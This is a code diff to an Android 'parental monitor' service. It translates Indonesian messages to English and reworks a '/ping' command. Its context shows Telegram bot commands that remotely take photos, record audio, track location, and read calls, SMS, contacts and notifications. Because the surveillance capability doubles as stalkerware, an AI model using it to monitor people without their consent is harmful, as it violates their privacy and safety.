@@ -684,8 +684,8 @@ class MonitoringService : Service() {
             )
             val notification = NotificationCompat.Builder(this, ParentalMonitorApp.RESUME_CHANNEL_ID)
                 .setSmallIcon(R.drawable.ic_notification)
-                .setContentTitle("Bot token ditolak ($code)")
-                .setContentText("Buka Setup untuk perbaiki token agar perintah aktif lagi.")
+                .setContentTitle("Bot token rejected ($code)")
+                .setContentText("Open Setup to fix the token so commands work again.")
                 .setContentIntent(tap)
                 .setAutoCancel(true)
                 .build()
@@ -707,7 +707,7 @@ class MonitoringService : Service() {
     private fun botCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
         return listOf(
             com.redeye.parentalmonitor.network.BotCommand("photo", "Take a photo now"),
-            com.redeye.parentalmonitor.network.BotCommand("camera", "Switch camera: /camera depan|belakang"),
+            com.redeye.parentalmonitor.network.BotCommand("camera", "Switch camera: /camera front|back"),
             com.redeye.parentalmonitor.network.BotCommand("location", "Send current location"),
             com.redeye.parentalmonitor.network.BotCommand("lastcalls", "Show last 5 calls"),
             com.redeye.parentalmonitor.network.BotCommand("lastsms", "Show last 5 SMS"),
@@ -724,15 +724,14 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("clearqueue", "Drop queued messages"),
             com.redeye.parentalmonitor.network.BotCommand("lock", "Lock device screen"),
             com.redeye.parentalmonitor.network.BotCommand("ring", "Ring device aloud"),
-            com.redeye.parentalmonitor.network.BotCommand("ping", "Check bot delay"),
-            com.redeye.parentalmonitor.network.BotCommand("bangun", "Bangunkan semua loop"),
+            com.redeye.parentalmonitor.network.BotCommand("ping", "Check delay, wake: /ping [camera|location]"),
             com.redeye.parentalmonitor.network.BotCommand("record", "Record audio 5-60 s"),
-            com.redeye.parentalmonitor.network.BotCommand("sms", "Send SMS: /sms nomor pesan"),
+            com.redeye.parentalmonitor.network.BotCommand("sms", "Send SMS: /sms number message"),
             com.redeye.parentalmonitor.network.BotCommand("smsconfirm", "Confirm pending SMS"),
             com.redeye.parentalmonitor.network.BotCommand("lastnotif", "Show last notifications"),
             com.redeye.parentalmonitor.network.BotCommand("version", "Show app/device version"),
             com.redeye.parentalmonitor.network.BotCommand("uptime", "Show service uptime"),
-            com.redeye.parentalmonitor.network.BotCommand("contacts", "Search contacts: /contacts nama"),
+            com.redeye.parentalmonitor.network.BotCommand("contacts", "Search contacts: /contacts name"),
             com.redeye.parentalmonitor.network.BotCommand("apps", "List installed apps"),
             com.redeye.parentalmonitor.network.BotCommand("storage", "Show storage usage"),
             com.redeye.parentalmonitor.network.BotCommand("history", "Calls+SMS by number"),
@@ -772,11 +771,11 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.InlineButton(text, data)
         return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
             listOf(
-                listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDCCD Lokasi", "location")),
-                listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
-                listOf(button("\uD83D\uDCF7 Depan", "camfront"), button("\uD83D\uDCF7 Belakang", "camback")),
-                listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
-                listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDCCA Status", "status"))
+                listOf(button("\uD83D\uDCF8 Photo", "photo"), button("\uD83D\uDCCD Location", "location")),
+                listOf(button("\uD83D\uDCDE Calls", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
+                listOf(button("\uD83D\uDCF7 Front", "camfront"), button("\uD83D\uDCF7 Back", "camback")),
+                listOf(button("⏸️ Pause 60 min", "pause60"), button("▶️ Resume", "resume")),
+                listOf(button("\uD83D\uDD0B Battery", "battery"), button("\uD83D\uDCCA Status", "status"))
             )
         )
     }
@@ -785,7 +784,7 @@ class MonitoringService : Service() {
         val nowSec = System.currentTimeMillis() / 1000L
         if (sentAtSec > 0 && (nowSec - sentAtSec > COMMAND_MAX_AGE_SEC || sentAtSec - nowSec > 300L)) {
             serviceScope.launch {
-                sendToTelegram("\u23F3\uFE0F Command kedaluwarsa, kirim ulang.")
+                sendToTelegram("\u23F3\uFE0F Command expired, send again.")
             }
             return
         }
@@ -810,7 +809,7 @@ class MonitoringService : Service() {
         if (sentAtSec > 0 && command in setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")) {
             val ageSec = System.currentTimeMillis() / 1000L - sentAtSec
             if (ageSec > 300L) {
-                sendToTelegram("\u23F3\uFE0F Command $command kedaluwarsa, kirim ulang.")
+                sendToTelegram("\u23F3\uFE0F Command $command expired, send again.")
                 return
             }
         }
@@ -822,7 +821,7 @@ class MonitoringService : Service() {
                         "belakang", "back" -> preferencesManager.cameraFacing = "back"
                         "depan", "front" -> preferencesManager.cameraFacing = "front"
                         else -> {
-                            sendToTelegram("Usage: /photo [depan|belakang]")
+                            sendToTelegram("Usage: /photo [front|back]")
                             return
                         }
                     }
@@ -940,7 +939,7 @@ class MonitoringService : Service() {
                         sendToTelegram("📸 Camera set to front.")
                     }
                     else -> {
-                        sendToTelegram("Usage: /camera \u003cdepan|belakang\u003e (now: ${preferencesManager.cameraFacing})")
+                        sendToTelegram("Usage: /camera \u003cfront|back\u003e (now: ${preferencesManager.cameraFacing})")
                     }
                 }
             }
@@ -1022,22 +1021,10 @@ class MonitoringService : Service() {
                 restartAllLoops()
                 sendToTelegram("\u267B\uFE0F Loops restarted.")
             }
-            "/bangun" -> {
-                restartAllLoops()
-                try {
-                    MessageScheduler.scheduleWatchdog(this)
-                } catch (_: Exception) {
-                }
-                try {
-                    MessageScheduler.scheduleMessageSend(this)
-                } catch (_: Exception) {
-                }
-                sendToTelegram("⏰ Bangun! Semua loop dibangunkan.")
-            }
             "/flush" -> {
                 val queued = messageQueue.getQueueSize()
                 if (authBlocked()) {
-                    sendToTelegram("⚠️ Flush ditunda: kredensial bot ditolak (${preferencesManager.credentialError}). Perbaiki token di Setup.")
+                    sendToTelegram("⚠️ Flush delayed: bot credentials rejected (${preferencesManager.credentialError}). Fix the token in Setup.")
                     return
                 }
                 val scheduled = MessageScheduler.scheduleMessageSend(this)
@@ -1088,11 +1075,28 @@ class MonitoringService : Service() {
                 }
             }
             "/ping" -> {
-                if (sentAtSec > 0) {
-                    val lag = System.currentTimeMillis() / 1000L - sentAtSec
-                    sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s.")
-                } else {
-                    sendToTelegram("\uD83C\uDFD3 Pong! " + TimeFmt.full(System.currentTimeMillis()))
+                when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
+                    "camera", "photo" -> {
+                        restartCameraLoop()
+                        handleTelegramCommand("/photo", sentAtSec)
+                    }
+                    "location", "loc", "gps" -> {
+                        handleTelegramCommand("/location", sentAtSec)
+                    }
+                    "" -> {
+                        val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true
+                        if (!loopsOk) restartAllLoops()
+                        val tail = if (loopsOk) "" else " ⏰ Loops restarted."
+                        if (sentAtSec > 0) {
+                            val lag = System.currentTimeMillis() / 1000L - sentAtSec
+                            sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s." + tail)
+                        } else {
+                            sendToTelegram("\uD83C\uDFD3 Pong! " + TimeFmt.full(System.currentTimeMillis()) + tail)
+                        }
+                    }
+                    else -> {
+                        sendToTelegram("Usage: /ping [camera|location]")
+                    }
                 }
             }
             "/record" -> {
@@ -1119,20 +1123,20 @@ class MonitoringService : Service() {
                 val smsText = arg.substringAfter(" ", "").trim()
                 val normalized = if (number.startsWith("+")) "+" + number.drop(1).filter { it.isDigit() } else number.filter { it.isDigit() }
                 if (number.isEmpty() || smsText.isEmpty()) {
-                    sendToTelegram("Usage: /sms \u003cnomor\u003e \u003cpesan\u003e")
+                    sendToTelegram("Usage: /sms \u003cnumber\u003e \u003cmessage\u003e")
                 } else if (!normalized.matches(SMS_NUMBER_REGEX)) {
-                    sendToTelegram("\u26A0\uFE0F Nomor tidak valid. Usage: /sms \u003cnomor\u003e \u003cpesan\u003e")
+                    sendToTelegram("\u26A0\uFE0F Invalid number. Usage: /sms \u003cnumber\u003e \u003cmessage\u003e")
                 } else if (isPremiumSmsNumber(normalized)) {
-                    sendToTelegram("\uD83D\uDEAB Nomor premium tidak diizinkan untuk /sms.")
+                    sendToTelegram("\uD83D\uDEAB Premium numbers are not allowed for /sms.")
                 } else if (smsText.length > 500) {
-                    sendToTelegram("\u26A0\uFE0F Pesan terlalu panjang (maks 500 karakter).")
+                    sendToTelegram("\u26A0\uFE0F Message too long (max 500 characters).")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
                 } else {
                     preferencesManager.pendingSmsNumber = normalized
                     preferencesManager.pendingSmsText = smsText
                     preferencesManager.pendingSmsAt = System.currentTimeMillis()
-                    sendToTelegram("\uD83D\uDCE9 SMS ke <code>$normalized</code> siap dikirim. Balas /smsconfirm untuk konfirmasi (berlaku 5 menit).")
+                    sendToTelegram("\uD83D\uDCE9 SMS to <code>$normalized</code> ready to send. Reply /smsconfirm to confirm (valid for 5 minutes).")
                 }
             }
             "/smsconfirm" -> {
@@ -1143,9 +1147,9 @@ class MonitoringService : Service() {
                     preferencesManager.pendingSmsNumber = ""
                     preferencesManager.pendingSmsText = ""
                     preferencesManager.pendingSmsAt = 0L
-                    sendToTelegram("\u23F1\uFE0F Tidak ada SMS tertunda. Kirim /sms \u003cnomor\u003e \u003cpesan\u003e dulu.")
+                    sendToTelegram("\u23F1\uFE0F No pending SMS. Send /sms \u003cnumber\u003e \u003cmessage\u003e first.")
                 } else if (System.currentTimeMillis() - preferencesManager.lastSmsSendAt < 60_000L) {
-                    sendToTelegram("\u26A0\uFE0F Tunggu sebentar sebelum kirim SMS lagi.")
+                    sendToTelegram("\u26A0\uFE0F Please wait a moment before sending another SMS.")
                 } else if (!smsBusy.compareAndSet(false, true)) {
                     sendToTelegram("\u23F1\uFE0F SMS still sending, please wait.")
                 } else {
@@ -1206,7 +1210,7 @@ class MonitoringService : Service() {
             }
             "/contacts" -> {
                 if (arg.isEmpty()) {
-                    sendToTelegram("Usage: /contacts \u003cnama\u003e")
+                    sendToTelegram("Usage: /contacts \u003cname\u003e")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Contacts permission missing. Open Setup and grant Contacts permission.")
                 } else {
@@ -1254,7 +1258,7 @@ class MonitoringService : Service() {
             "/history" -> {
                 val digits = arg.filter { it.isDigit() }
                 if (digits.length < 7) {
-                    sendToTelegram("Usage: /history \u003cnomor\u003e (min 7 digit)")
+                    sendToTelegram("Usage: /history \u003cnumber\u003e (min 7 digits)")
                 } else {
                     val calls = try {
                         callLogRepository.getCallsForNumber(digits, 50).filter { numberMatches(it.number, digits) }.take(5)
@@ -1281,7 +1285,7 @@ class MonitoringService : Service() {
                         appendLine()
                         appendLine("🤖 <b>Commands</b>")
                         appendLine("/photo - take a photo now")
-                        appendLine("/camera \u003cdepan|belakang\u003e - switch camera")
+                        appendLine("/camera \u003cfront|back\u003e - switch camera")
                         appendLine("/location - send current location")
                         appendLine("/lastcalls - show last 5 calls")
                         appendLine("/lastsms - show last 5 SMS")
@@ -1298,18 +1302,17 @@ class MonitoringService : Service() {
                         appendLine("/clearqueue - drop queued messages")
                         appendLine("/lock - lock device screen")
                         appendLine("/ring [5-60] - ring device aloud")
-                        appendLine("/ping - check bot delay")
-                        appendLine("/bangun - bangunkan semua loop")
+                        appendLine("/ping [camera|location] - check delay + wake target")
                         appendLine("/record \u003c5-60\u003e - record audio seconds")
-                        appendLine("/sms \u003cnomor\u003e \u003cpesan\u003e - send SMS")
-                        appendLine("/smsconfirm - kirim SMS yang dikonfirmasi")
+                        appendLine("/sms \u003cnumber\u003e \u003cmessage\u003e - send SMS")
+                        appendLine("/smsconfirm - send the confirmed SMS")
                         appendLine("/lastnotif - show last notifications")
                         appendLine("/version - show app/device version")
                         appendLine("/uptime - show service uptime")
-                        appendLine("/contacts \u003cnama\u003e - search contacts")
+                        appendLine("/contacts \u003cname\u003e - search contacts")
                         appendLine("/apps [N] - list installed apps")
                         appendLine("/storage - show storage usage")
-                        appendLine("/history \u003cnomor\u003e - calls+SMS by number")
+                        appendLine("/history \u003cnumber\u003e - calls+SMS by number")
                         appendLine("/log - show last crash/error log")
                         appendLine("/help - show this list")
                     },
@@ -2178,7 +2181,7 @@ class MonitoringService : Service() {
         if (authBlocked()) {
             serviceScope.launch {
                 if (reportResult) {
-                    sendToTelegram("Auth ditolak, foto ditunda sampai token diperbaiki di Setup.")
+                    sendToTelegram("Auth rejected, photo delayed until the token is fixed in Setup.")
                 }
             }
             return
